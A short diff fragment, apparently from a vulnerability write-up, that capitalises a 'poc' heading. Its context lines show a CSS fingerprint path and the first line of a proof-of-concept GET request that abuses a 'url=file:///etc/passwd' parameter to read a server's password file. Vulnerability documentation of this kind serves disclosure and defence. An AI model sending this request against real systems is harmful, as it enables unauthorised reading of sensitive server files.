@@ -8,7 +8,7 @@
 "/static/theme/maowang51/css/style.css"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /pay/xinhui/request_post?url=file:///etc/passwd&post_data[1]=aaa HTTP/1.1
